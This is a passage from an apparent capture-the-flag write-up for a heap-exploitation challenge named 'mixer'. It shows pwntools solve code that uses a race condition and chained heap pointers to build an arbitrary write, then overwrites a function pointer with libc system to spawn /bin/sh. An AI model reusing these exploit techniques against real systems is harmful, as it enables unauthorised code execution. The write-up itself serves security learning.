        <span class="n">add</span><span class="p">(</span><span class="n">PTRPTRPTR</span><span class="p">,</span> <span class="n">ONE_ZERO</span><span class="p">)</span>

    <span class="c1"># Reset PTRPTR</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span> <span class="o">-</span> <span class="mi">8</span><span class="p">):</span>
        <span class="n">add</span><span class="p">(</span><span class="n">PTRPTRPTR</span><span class="p">,</span> <span class="n">ONE_ZERO</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">write_val</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Writes a value into the pointer in PTR.</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
        <span class="n">byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">target</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>

        <span class="c1"># Again, clear the byte at the given address</span>
        <span class="n">cpy</span><span class="p">(</span><span class="n">PTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>
        <span class="n">xor</span><span class="p">(</span><span class="n">PTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

        <span class="c1"># Increment to the desired value</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">byte</span><span class="p">):</span>
            <span class="n">add</span><span class="p">(</span><span class="n">PTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

        <span class="c1"># Add one to PTR</span>
        <span class="n">add</span><span class="p">(</span><span class="n">PTRPTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>
</code></pre></div>

<h3>ARB-write to shell</h3>
<p>At last, we need to turn this arbitrary write into a shell. There are multiple options for doing this. The binary itself features only partial RELRO, so attacking the GOT is a valid option. However, the program also keeps function pointers on the heap. These are easy to exploit, since we always control the first parameter of the function call.</p>
<p>I chose to overwrite the <code>f_use</code> function with the following calls:</p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Overwrite the f_use pointer with system</span>
<span class="n">write_ptr_val</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x450</span><span class="p">)</span>
<span class="n">write_val</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span>
</code></pre></div>

<p>Since <code>f_use</code> -&gt; <code>system</code>, calling <code>f_use("/bin/sh")</code> will instead call <code>system("/bin/sh")</code>. We can therefore trigger a shell by simply calling it:</p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Since use points at system, we get system(&quot;/bin/sh&quot;)</span>
<span class="n">use</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">)</span>
</code></pre></div>

<hr />
<h2>Solution</h2>
<p>Below is the my full solve script, including the creation of incrementors. This challenge took quite a bit of creativity in order to solve. From talking with another team, I know there to be at least two different approaches. The nature of this other approach, I am not aware of.</p>
<p>As a small side note, this exploit is possible to do with only two pointers, provided you only need to write to the heap. For the sake of the given exploit, linking three pointers is overkill. It does however create the possibility for complete ARB-write, which I find rewarding by itself :)</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Thread</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&quot;./mixer_patched&quot;</span>
<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;mixer.ctf&quot;</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">([</span><span class="n">lib</span> <span class="k">for</span> <span class="n">lib</span> <span class="ow">in</span> <span class="n">elf</span><span class="o">.</span><span class="n">libs</span> <span class="k">if</span> <span class="s1">&#39;/libc.&#39;</span> <span class="ow">in</span> <span class="n">lib</span> <span class="ow">or</span> <span class="s1">&#39;/libc-&#39;</span> <span class="ow">in</span> <span class="n">lib</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;WARNING&quot;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">,</span> <span class="s1">&#39;-F&#39;</span> <span class="s1">&#39;#</span><span class="si">{pane_pid}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;-P&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;70&#39;</span><span class="p">]</span>
<span class="n">context</span><span class="o">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s2">&quot;~/.gdbinit_splitmind&quot;</span>
<span class="n">env</span> <span class="o">=</span> <span class="p">{}</span> <span class="c1"># {&quot;LD_LIBRARY_PATH&quot;: &quot;./&quot;, &quot;LD_PRELOAD&quot;: &quot;&quot;}</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">c</span>
<span class="s1">&#39;&#39;&#39;</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">no_gdb</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">connect</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">RAW</span> <span class="ow">or</span> <span class="n">no_gdb</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">BINARY</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">)</span>

<span class="sd">&quot;&quot;&quot; Code to manage allocated blocks, only for main connection &quot;&quot;&quot;</span>
<span class="n">occupied</span> <span class="o">=</span> <span class="p">[</span><span class="kc">False</span><span class="p">]</span><span class="o">*</span> <span class="mi">16</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">occupied</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
            <span class="n">occupied</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
            <span class="k">return</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>

    <span class="k">return</span> <span class="kc">None</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
    <span class="n">occupied</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span> 

<span class="sd">&quot;&quot;&quot; Meta functions to make interaction easier &quot;&quot;&quot;</span>
<span class="k">def</span> <span class="nf">use</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;use </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">alloc</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">fin</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;fin </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">free</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">load</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;load </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">save</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;save </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">drop</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;drop </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">rand</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;rand </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">zero</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;zero </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx1</span><span class="p">,</span> <span class="n">idx2</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;add </span><span class="si">{</span><span class="n">idx1</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">idx2</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">cpy</span><span class="p">(</span><span class="n">idx1</span><span class="p">,</span> <span class="n">idx2</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;cpy </span><span class="si">{</span><span class="n">idx1</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">idx2</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">idx1</span><span class="p">,</span> <span class="n">idx2</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;xor </span><span class="si">{</span><span class="n">idx1</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">idx2</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">alt</span><span class="p">(</span><span class="n">idx1</span><span class="p">,</span> <span class="n">idx2</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;alt </span><span class="si">{</span><span class="n">idx1</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">idx2</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">min</span><span class="p">(</span><span class="n">idx1</span><span class="p">,</span> <span class="n">idx2</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;min </span><span class="si">{</span><span class="n">idx1</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">idx2</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">max</span><span class="p">(</span><span class="n">idx1</span><span class="p">,</span> <span class="n">idx2</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;max </span><span class="si">{</span><span class="n">idx1</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">idx2</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;show </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="sd">&quot;&quot;&quot; Additional functions supporting tubes by args &quot;&quot;&quot;</span>
<span class="k">def</span> <span class="nf">use_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;use </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">load_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;load </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">save_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;save </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">zero_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;zero </span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">use_namespace</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">namespace</span><span class="p">):</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="n">namespace</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="sd">&quot;&quot;&quot; Dupe code &quot;&quot;&quot;</span>
<span class="n">stop_dupe</span> <span class="o">=</span> <span class="kc">False</span>

<span class="k">def</span> <span class="nf">dupe_loader</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    This is the rc loader. It continuesly loads the dupe file until it hits a failed read, </span>
<span class="sd">    meaning the size of the file has changed, and the chunk has been freed with a dangling pointer.</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="n">load_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

        <span class="k">if</span> <span class="sa">b</span><span class="s2">&quot;failed&quot;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
            <span class="k">return</span>

<span class="k">def</span> <span class="nf">dupe_saver</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    This is the rc saver. It continuesly saves the same file, alternating between two sizes.</span>
<span class="sd">    When the file size changes down during a read, read will return one less than expected in the loader.</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="k">while</span> <span class="ow">not</span> <span class="n">stop_dupe</span><span class="p">:</span>
        <span class="n">zero_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">,</span> <span class="n">size</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">save_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">)</span>
        <span class="n">zero_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
        <span class="n">save_conn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">slot</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">dupe_chunk</span><span class="p">(</span><span class="n">conn1</span><span class="p">,</span> <span class="n">conn2</span><span class="p">,</span> <span class="n">slot</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot; Runs the rc thread. &quot;&quot;&quot;</span>

    <span class="k">global</span> <span class="n">stop_dupe</span>
    <span class="n">t1</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">dupe_saver</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">conn2</span><span class="p">,</span> <span class="n">slot</span><span class="p">,</span> <span class="n">size</span><span class="p">))</span>

    <span class="n">t1</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
    <span class="n">dupe_loader</span><span class="p">(</span><span class="n">conn1</span><span class="p">,</span> <span class="n">slot</span><span class="p">)</span>
    <span class="n">stop_dupe</span> <span class="o">=</span> <span class="kc">True</span>
    <span class="n">t1</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">create_incrementors</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Creates the incrementor slots, ie. the slots containing \x01, \x00\x01 and \x01\x00.</span>
<span class="sd">    I initially just randomized the chunk until i got a one, but that whas unstable, probably because of opening urandom.</span>
<span class="sd">    Here, I use rand to generate a number with a modulo invers of less than 50, after which i just add the number n times to itself.</span>
<span class="sd">    This works basically all the time. This file won&#39;t be run while the files exist on the remote.</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="n">period</span> <span class="o">=</span> <span class="mi">999999</span>
    <span class="n">TEMP</span> <span class="o">=</span> <span class="n">use</span><span class="p">(</span><span class="s2">&quot;temp&quot;</span><span class="p">)</span>

    <span class="c1"># Initialize the slots with values</span>
    <span class="n">zero</span><span class="p">(</span><span class="n">ONE</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">zero</span><span class="p">(</span><span class="n">ONE_ZERO</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">zero</span><span class="p">(</span><span class="n">ZERO_ONE</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>

    <span class="c1"># Iterate until the modulo invers is less than 51</span>
    <span class="k">while</span> <span class="n">period</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">:</span>

        <span class="c1">#  Get a single random byte</span>
        <span class="n">rand</span><span class="p">(</span><span class="n">ONE</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">show</span><span class="p">(</span><span class="n">ONE</span><span class="p">)</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
        <span class="n">val</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;(&quot;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

        <span class="c1"># python throws a ValueError if the number is not inversable</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">period</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
            <span class="k">pass</span>

    <span class="c1"># Duplicate the \x01 into a temporary slot</span>
    <span class="n">zero</span><span class="p">(</span><span class="n">TEMP</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">cpy</span><span class="p">(</span><span class="n">TEMP</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

    <span class="c1"># Add the number to itself `period` times</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">period</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">add</span><span class="p">(</span><span class="n">ONE</span><span class="p">,</span> <span class="n">TEMP</span><span class="p">)</span>

    <span class="c1"># This is a bit of trickery</span>
    <span class="c1"># We can use the alt function to create \x00\x01 and \x01\x00</span>
    <span class="n">cpy</span><span class="p">(</span><span class="n">ZERO_ONE</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>
    <span class="n">alt</span><span class="p">(</span><span class="n">ZERO_ONE</span><span class="p">,</span> <span class="n">ONE_ZERO</span><span class="p">)</span>
    <span class="n">alt</span><span class="p">(</span><span class="n">ONE_ZERO</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

    <span class="c1"># Save all the files for future usage</span>
    <span class="n">save</span><span class="p">(</span><span class="n">ONE</span><span class="p">)</span>
    <span class="n">save</span><span class="p">(</span><span class="n">ONE_ZERO</span><span class="p">)</span>
    <span class="n">save</span><span class="p">(</span><span class="n">ZERO_ONE</span><span class="p">)</span>

    <span class="c1"># Save is an implicit drop, so we need to load them again</span>
    <span class="n">load</span><span class="p">(</span><span class="n">ONE</span><span class="p">)</span>
    <span class="n">load</span><span class="p">(</span><span class="n">ONE_ZERO</span><span class="p">)</span>
    <span class="n">load</span><span class="p">(</span><span class="n">ZERO_ONE</span><span class="p">)</span>

    <span class="c1"># Finally, we can delete the temporary slot</span>
    <span class="n">fin</span><span class="p">(</span><span class="n">TEMP</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">write_ptr_val</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Writes a pointer into the PTR slot for use in ARB write.</span>
<span class="sd">    Also resets PTRPTR to the start of PTR.</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
        <span class="n">byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">target</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>

        <span class="c1"># Clear the given byte, easier than knowing it</span>
        <span class="n">cpy</span><span class="p">(</span><span class="n">PTRPTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>
        <span class="n">xor</span><span class="p">(</span><span class="n">PTRPTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

        <span class="c1"># Add 1 until we have the desired value</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">byte</span><span class="p">):</span>
            <span class="n">add</span><span class="p">(</span><span class="n">PTRPTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

        <span class="c1"># Increment PTRPTR by one</span>
        <span class="n">add</span><span class="p">(</span><span class="n">PTRPTRPTR</span><span class="p">,</span> <span class="n">ONE_ZERO</span><span class="p">)</span>

    <span class="c1"># Reset PTRPTR</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span> <span class="o">-</span> <span class="mi">8</span><span class="p">):</span>
        <span class="n">add</span><span class="p">(</span><span class="n">PTRPTRPTR</span><span class="p">,</span> <span class="n">ONE_ZERO</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">write_val</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Writes a value into the pointer in PTR.</span>
<span class="sd">    &quot;&quot;&quot;</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
        <span class="n">byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">target</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span>

        <span class="c1"># Again, clear the byte at the given address</span>
        <span class="n">cpy</span><span class="p">(</span><span class="n">PTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>
        <span class="n">xor</span><span class="p">(</span><span class="n">PTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

        <span class="c1"># Increment to the desired value</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">byte</span><span class="p">):</span>
            <span class="n">add</span><span class="p">(</span><span class="n">PTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

        <span class="c1"># Add one to PTR</span>
        <span class="n">add</span><span class="p">(</span><span class="n">PTRPTR</span><span class="p">,</span> <span class="n">ONE</span><span class="p">)</span>

<span class="c1"># ----------------------------------- RACE CONDITION -----------------------------------</span>

<span class="c1"># Start conn, the main tube we will be exploiting</span>
